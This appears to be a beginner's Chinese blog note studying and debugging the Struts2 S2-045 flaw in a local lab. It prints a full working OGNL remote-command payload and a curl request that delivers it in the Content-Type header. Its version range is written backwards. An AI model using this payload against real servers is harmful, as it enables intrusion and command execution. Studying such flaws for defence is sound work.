# S2-045 漏洞学习与调试

## 漏洞概述
### 影响版本
- 2.3.31 至 2.3.5
- 2.5 至 2.5.10

### 漏洞成因
当请求的 `Content-Type` 包含 `multipart/form-data` 时，Struts2 会使用 `JakartaMultiPartRequest` 来处理请求。此时，如果请求中包含恶意 OGNL 表达式（payload），这些表达式会在异常信息捕获过程中被解析并执行。

## Payload
以下是一个典型的利用此漏洞的 payload：
```java
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

## Burp Suite 中导出的 cURL 命令
```bash
curl -i -s -k  -X $'POST' \
    -H $'Host: 192.168.95.1:8081' -H $'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36' -H $'Accept: */*' -H $'Connection: close' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: %{(#fuck=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=\'id\').(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).(#cmds=(#iswin?{\'cmd.exe\',\'/c\',#cmd}:{\'/bin/bash\',\'-c\',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}' -H $'Content-Length: 0' \
    $'http://192.168.95.1:8081/S2_045_war_exploded/'
```

## 调试过程
### 修复点
在调试过程中，我在以下位置设置了断点：
1. **web.xml**：拦截 `Struts2PrepareAndExecuteFilter`。
2. **处理请求**：获取 `Content-Type`。
3. **getMultiPartRequest 方法**：通过配置 `struts.multipart.parser` 属性，可以指定不同的解析类，默认为 `org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest` 类。
4. **OGNL 解析入口**：`com.opensymphony.xwork2.util.TextParseUtil.translateVariables(String, ValueStack)` 方法扩展字符串中的 OGNL 表达式。
5. **语法树解析**：`com.opensymphony.xwork2.ognl.OgnlUtil#compileAndExecute` 和 `ognl.ASTVarRef#setValueBody` 方法执行 OGNL 表达式。
6. **初始化 OGNL**：`com.opensymphony.xwork2.ognl.OgnlValueStack#setOgnlUtil` 方法初始化 `OgnlValueStack` 的 `securityMemberAccess`。

### 调试细节
- 当请求到来时，创建一个 `ActionContext` 对象。
- `OgnlValueStack` 的 `setOgnlUtil` 函数被调用，以初始化 `OgnlValueStack` 的 `securityMemberAccess`。
- 这意味着全局 `OgnlUtil` 实例共享相同的 `excludedClasses`、`excludedPackageNames` 和 `excludedPackageNamePatterns` 集合。
- 清除这些集合后，OGNL 可以自由访问 `DEFAULT_MEMBER_ACCESS` 对象，并且 `OgnlContext` 的 `setMemberAccess` 代替了 `_memberAccess` 和 `DEFAULT_MEMBER_ACCESS`，从而允许执行任意代码。

### 示例
在 Mac 上调试时，payload 中的 `#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))` 执行结果为 `false`。

## 参考文章
- [作为武器的 CVE-2018-11776：绕过 Apache Struts 2.5.16 OGNL 沙箱](https://xz.aliyun.com/t/3395)
- [Struts2 架构图](https://zhuanlan.zhihu.com/p/50245867)

希望各位专家指正，我是新手，还在学习中。